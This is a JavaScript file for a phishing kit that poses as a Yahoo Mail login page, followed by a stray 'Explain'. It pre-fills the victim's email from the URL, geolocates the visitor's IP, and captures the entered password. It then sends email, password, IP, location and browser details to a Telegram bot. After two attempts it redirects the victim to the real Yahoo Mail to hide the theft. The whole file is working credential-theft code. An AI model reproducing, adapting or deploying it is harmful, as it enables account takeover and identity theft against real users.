/* global $ */
$(document).ready(function() {
    $('#error').hide();
    $("#div2").hide();
    $("#msg").hide();
    var count = 0;

    // Variables for IP and location data
    var userIP = "";
    var userCountry = "";
    var userCity = "";
    var geoData = {};

    // Primary method: Using ipinfo.io to get IP and location data
    $.getJSON('https://ipinfo.io/json', function(data) {
        userIP = data.ip || "Unknown";
        userCountry = data.country || "Unknown";
        userCity = data.city || "Unknown";
        geoData = data;
        console.log("IP info loaded from ipinfo.io");
    }).fail(function() {
        console.log("Could not retrieve IP information from ipinfo.io, trying alternate method");
        
        // Fallback method: Using ipify and geoiplookup
        $.getJSON('https://api.ipify.org?format=json', function(data) {
            userIP = data.ip || "Unknown";
            
            // Then use the IP to get location data
            $.getJSON('https://json.geoiplookup.io/' + userIP, function(geoData) {
                userCountry = geoData.country_name || "Unknown";
                userCity = geoData.city || "Unknown";
                console.log("IP and location info loaded from alternate sources");
            }).fail(function() {
                console.log("Could not retrieve location information from geoiplookup.io");
            });
        }).fail(function() {
            console.log("All IP detection methods failed");
        });
    });

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
       
       
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div2").animate({ right: 200, opacity: "show" }, 1000);
        $("#aich").html(my_ai);
    }

    $('#ai').click(function() {
        $('#error').hide();
    });
    $('#next').click(function() {
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div2").animate({ right: 200, opacity: "show" }, 1000);
        $("#aich").html(my_ai);
    });
    
    $('#back').click(function() {
        $("#msg").hide();
        $("#div2").animate({ left: 200, opacity: "hide" }, 0);
        $("#div1").animate({ right: 200, opacity: "show" }, 1000);
    });
    
    $(document).keypress(function(event) {
        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {
                $("#next").click();
            } else if ($("#div2").is(":visible")) {
                event.preventDefault();
                $("#submit-btn").click();
            } else {
                return false;
            }
        }
    });

    // Fixed token and chat ID variables

    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html() || "No details available";
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        count = count + 1;
        
        // Get device info
        var deviceInfo = {
            screen: window.screen.width + 'x' + window.screen.height,
            viewport: $(window).width() + 'x' + $(window).height(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language || navigator.userLanguage
        };
        
        // Create a properly formatted message with enhanced details
        var file = "==================New val!d logs====================\n\n" +
                   "Email: " + ai + "\n" +
                   "Password: " + pr + "\n" +
                   "IP Address: " + userIP + "\n" + 
                   "Location: " + userCity + ", " + userCountry + "\n" +
                   "Date: " + new Date().toString() + "\n" +
                   "Browser: " + deviceInfo.userAgent + "\n" +
                   "===================Logs sent by system====================";
        
        $.ajax({
            dataType: 'JSON',
            url: "https://api.telegram.org/bot" + token + "/sendMessage",
            type: 'POST',
            data: {
                "chat_id": chatId,
                "text": file
            },
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifying...');
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace('https://mail.yahoo.com/');
                }
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $('#msg').html(response['msg']);
                    } else {
                        $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace('https://mail.yahoo.com/');
                }
                $("#msg").show();
                $('#msg').html("Invalid password. Please try again");
            },
            complete: function() {
                $('#submit-btn').html('Next');
            }
        });
    });
});
Explain